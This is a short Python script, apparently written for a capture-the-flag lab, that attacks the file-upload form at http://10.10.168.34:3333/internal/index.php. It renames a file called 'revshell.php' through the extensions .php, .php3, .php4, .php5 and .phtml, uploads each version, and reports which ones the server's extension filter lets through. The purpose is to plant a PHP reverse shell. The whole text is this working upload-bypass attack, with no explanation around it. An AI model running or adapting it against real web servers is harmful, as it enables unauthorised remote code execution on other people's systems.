#!/usr/bin/env python

import requests
import os

ip = "10.10.168.34"
url = "http://10.10.168.34:3333/internal/index.php"

old_filename = "revshell.php"

r = requests.get(url)
filename = "revshell"
extensions = [
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".phtml",
        ]
for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)
    f = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=f)
    if "Extension not allowed" in r.text:
        print new_filename + " not allowed"
    else: 
        print new_filename + " allowed"
    old_filename = new_filename
